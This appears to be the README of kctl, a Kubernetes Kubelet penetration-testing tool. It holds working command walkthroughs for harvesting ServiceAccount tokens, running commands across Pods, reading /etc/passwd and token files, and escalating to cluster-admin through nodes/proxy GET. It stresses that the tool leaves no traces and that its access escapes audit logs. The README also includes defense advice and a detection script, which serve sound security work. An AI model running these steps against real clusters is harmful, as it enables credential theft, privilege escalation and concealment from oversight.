<p align="center">
  <img src="https://img.shields.io/github/v/release/kinopio1101/kctl?color=%2300ADD8&label=release&logo=github&logoColor=white" alt="GitHub Release">
  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white" alt="Go Version">
  <a href="https://github.com/kinopio1101/kctl/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-E11311.svg" alt="MIT License">
  </a>
  <a href="https://github.com/kinopio1101/kctl/issues">
    <img src="https://img.shields.io/github/issues/kinopio1101/kctl?color=%23F97316&logo=github" alt="GitHub Issues">
  </a>
  <a href="https://github.com/kinopio1101/kctl/stargazers">
    <img src="https://img.shields.io/github/stars/kinopio1101/kctl?color=%23FBBF24&logo=github" alt="GitHub Stars">
  </a>
</p>

<p align="center">
  <a href="./README.md"><img alt="README in English" src="https://img.shields.io/badge/English-d9d9d9"></a>
  <a href="./README.zh-CN.md"><img alt="简体中文版自述文件" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
</p>

<h1 align="center">
  <br>
  <img src="https://raw.githubusercontent.com/kubernetes/kubernetes/master/logo/logo.svg" alt="kctl" width="120">
  <br>
  kctl
  <br>
</h1>

<h4 align="center">Kubernetes Kubelet Security Audit Tool - Penetration Testing & Lateral Movement</h4>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#commands">Commands</a> •
  <a href="#attack-scenario">Attack Scenario</a> •
  <a href="#defense">Defense</a>
</p>

---

## Overview

**kctl** is a lightweight Kubernetes security audit tool specifically designed for Kubelet API security assessment and privilege analysis. Built for penetration testing scenarios, it supports automatic environment detection and lateral movement when running inside a Pod.

### Key Features

- **Network Discovery** - Scan network ranges to discover Kubelet nodes
- **SA Permission Analysis** - Scan all Pod ServiceAccount tokens and analyze permissions
- **Risk Assessment** - Automatically identify high-risk permissions (cluster-admin, nodes/proxy, etc.)
- **Lateral Movement** - Execute commands across Pods via Kubelet API
- **Stealth Operation** - All data cached in memory, automatically cleared on exit

## Features

| Feature | Description |
|---------|-------------|
| `discover` | Scan network ranges to find Kubelet endpoints |
| `sa scan` | Extract and analyze SA tokens from all Pods |
| `sa list` | List discovered ServiceAccounts with risk levels |
| `exec` | Execute commands in any Pod via Kubelet API (WebSocket) |
| `run` | Execute commands via /run API (simpler, no WebSocket) |
| `portforward` | Port forwarding through Kubelet API (SPDY) |
| `pid2pod` | Map Linux PIDs to Pod metadata (in-Pod only) |
| `pods` | List all Pods on the node |

## Installation

### Download Binary

```bash
# Linux amd64
curl -LO https://github.com/kinopio1101/kctl/releases/latest/download/kctl-linux-amd64
chmod +x kctl-linux-amd64
mv kctl-linux-amd64 /usr/local/bin/kctl

# macOS arm64
curl -LO https://github.com/kinopio1101/kctl/releases/latest/download/kctl-darwin-arm64
chmod +x kctl-darwin-arm64
mv kctl-darwin-arm64 /usr/local/bin/kctl
```

### Build from Source

```bash
git clone https://github.com/kinopio1101/kctl.git
cd kctl
go build -o kctl ./main/main.go
```

## Quick Start

### Basic Usage

```bash
# Enter interactive console
./kctl console

# Specify target
./kctl console -t 10.0.0.1

# Full connection parameters
./kctl console -t 10.0.0.1 -p 10250 --token "eyJ..." --api-server 10.0.0.1 --api-port 6443

# Use SOCKS5 proxy
./kctl console -t 10.0.0.1 --proxy socks5://127.0.0.1:1080
```

### Auto-Detection in Pod

When running inside a Pod, kctl automatically:
1. Detects Kubelet IP (default gateway)
2. Reads ServiceAccount token
3. Connects to Kubelet
4. Checks current SA permissions

```
$ ./kctl console

    ██╗  ██╗ ██████╗████████╗██╗
    ██║ ██╔╝██╔════╝╚══██╔══╝██║
    █████╔╝ ██║        ██║   ██║
    ██╔═██╗ ██║        ██║   ██║
    ██║  ██╗╚██████╗   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
                Kubelet Security Audit Tool

  Mode        : In-Pod (Memory Database)
  Kubelet     : 10.244.1.1:10250 (auto-detected)
  Token       : /var/run/secrets/kubernetes.io/serviceaccount/token

[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: CRITICAL

kctl [default/attacker CRITICAL]>
```

## Commands

### Console Commands

| Command | Description |
|---------|-------------|
| `help` | Show help information |
| `discover <target>` | Scan network range for Kubelet nodes |
| `connect [ip]` | Connect to Kubelet (optional, auto-connects) |
| `sa` | ServiceAccount operations |
| `sa list` | List scanned ServiceAccounts |
| `sa scan` | Scan all Pod SA tokens |
| `sa use <ns/name>` | Switch to specified SA |
| `sa info` | Show current SA details |
| `pods` | List Pods on the node |
| `exec` | Execute command in Pod (WebSocket) |
| `run` | Execute command in Pod (/run API) |
| `portforward` | Port forwarding to Pod |
| `pid2pod` | Map PIDs to Pods (in-Pod only) |
| `set <key> <value>` | Set configuration |
| `show options` | Show current configuration |
| `show status` | Show session status |
| `show kubelets` | Show discovered Kubelet nodes |
| `export json/csv` | Export scan results |
| `clear` | Clear cache |
| `exit` | Exit console |

### Network Discovery

```bash
# Scan CIDR range
discover 10.0.0.0/24

# Scan IP range
discover 10.0.0.1-254

# Custom ports and concurrency
discover 10.0.0.0/24 -p 10250,10255 -c 200

# Show all open ports (not just Kubelet)
discover 10.0.0.0/24 --all
```

### ServiceAccount Operations

```bash
# List all SAs (default)
sa

# List risky SAs only
sa list --risky

# List cluster-admin only
sa list --admin

# Scan all Pod SA tokens
sa scan

# Select SA
sa use kube-system/cluster-admin

# Show current SA details
sa info
```

### Command Execution

```bash
# Interactive shell (WebSocket)
exec -it nginx-pod

# Execute command in specific Pod
exec nginx-pod -- cat /etc/passwd

# Execute across all Pods
exec --all-pods -- whoami

# Execute with filters
exec --all-pods --filter-ns kube-system -- id

# Use /run API (simpler, no WebSocket)
run nginx-pod --cmd "cat /etc/passwd"

# Run across all Pods
run --all-pods --cmd "hostname"
```

### Port Forwarding

```bash
# Forward local port 8080 to Pod port 80
portforward nginx-pod 8080:80

# Forward with custom listen address
portforward nginx-pod 8080:80 --address 0.0.0.0

# Stop port forwarding
pf stop
```

### PID to Pod Mapping (In-Pod Only)

```bash
# Show all container processes with Pod info
pid2pod

# Look up specific PID
pid2pod --pid 1234

# Show all processes including non-container
pid2pod --all
```

## Attack Scenario

### nodes/proxy Privilege Escalation

The `nodes/proxy GET` permission is commonly granted to monitoring tools (Prometheus, Datadog, Grafana) but can be exploited for RCE.

Based on [Graham Helton's research](https://grahamhelton.com/blog/nodes-proxy-rce), due to Kubelet's authorization flaw with WebSocket connections, `nodes/proxy GET` can be used to execute commands in any Pod.

#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                 nodes/proxy GET Privilege Escalation            │
└─────────────────────────────────────────────────────────────────┘

┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│ Initial      │     │ Permission   │     │ Lateral Movement     │
│ Access       │     │ Discovery    │     │                      │
│              │────>│              │────>│ Execute commands in  │
│ Compromised  │     │ nodes/proxy  │     │ other Pods via       │
│ Pod          │     │ GET found    │     │ Kubelet API          │
└──────────────┘     └──────────────┘     └──────────────────────┘
                                                    │
                                                    v
┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│ Full Cluster │     │ Privilege    │     │ Token Theft          │
│ Control      │     │ Escalation   │     │                      │
│              │<────│              │<────│ Read system Pod      │
│ cluster-admin│     │ Use high-    │     │ SA tokens            │
│ access       │     │ priv token   │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
```

#### Step-by-Step

```bash
# 1. Copy kctl to target Pod
kubectl cp kctl-linux-amd64 attacker:/kctl

# 2. Enter Pod and run kctl
kubectl exec -it attacker -- /bin/sh
/kctl console

# 3. Scan all SA tokens
kctl> sa scan

# 4. Find high-privilege SA
kctl> sa list --admin

# 5. Execute command in system Pod to steal token
kctl> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 6. Switch to high-privilege SA
kctl> sa use kube-system/kube-proxy

# 7. Now you have cluster-admin!
kctl [kube-system/kube-proxy ADMIN]>
```

## Risk Levels

| Level | Description | Example Permissions |
|-------|-------------|---------------------|
| ADMIN | Cluster administrator | `*/*`, cluster-admin |
| CRITICAL | Direct privilege escalation | `secrets:create`, `pods/exec:create` |
| HIGH | Sensitive data exposure | `secrets:get`, `nodes/proxy:get` |
| MEDIUM | Potential abuse | `pods:create`, `configmaps:get` |
| LOW | Low risk | `pods:list`, `services:get` |
| NONE | No risk | Read-only basic permissions |

## Defense

### Recommendations

1. **Avoid nodes/proxy permissions** - Use KEP-2862 fine-grained permissions (`nodes/metrics`, `nodes/stats`)
2. **Network isolation** - Restrict access to Kubelet port (10250)
3. **Audit logging** - Note: Direct Kubelet API access bypasses K8s audit logs
4. **Least privilege** - Regularly review ServiceAccount permissions

### Detection Script

Check for ServiceAccounts with `nodes/proxy` permission:

```bash
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | 
  select(.roleRef.kind == "ClusterRole") |
  .metadata.name as $binding |
  .roleRef.name as $role |
  .subjects[]? |
  "\($binding) -> \($role) -> \(.kind)/\(.namespace)/\(.name)"
' | while read line; do
  role=$(echo $line | cut -d'>' -f2 | tr -d ' ')
  kubectl get clusterrole $role -o json 2>/dev/null | \
    jq -e '.rules[] | select(.resources[] | contains("nodes/proxy"))' >/dev/null && \
    echo "[!] $line"
done
```

## Project Structure

```
kctl/
├── cmd/
│   ├── console/            # Console command entry
│   └── rootCmd.go
├── internal/
│   ├── console/            # Interactive console
│   │   └── commands/       # Console commands
│   │       └── sa/         # SA subcommands
│   ├── session/            # Session state management
│   ├── client/
│   │   ├── kubelet/        # Kubelet API client
│   │   └── k8s/            # K8s API client
│   ├── db/                 # SQLite in-memory database
│   └── rbac/               # Permission analysis
├── pkg/
│   ├── network/            # Network utilities (scanner)
│   ├── token/              # JWT token parsing
│   └── types/              # Type definitions
└── config/                 # Configuration
```

## Disclaimer

- This tool is intended for **authorized security assessments and penetration testing only**
- Ensure you have proper authorization before use
- All operations are performed in memory, leaving no traces after exit
- Direct Kubelet API access is **not recorded** in Kubernetes audit logs

## References

- [Kubernetes RCE Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)

## License

[MIT License](LICENSE)
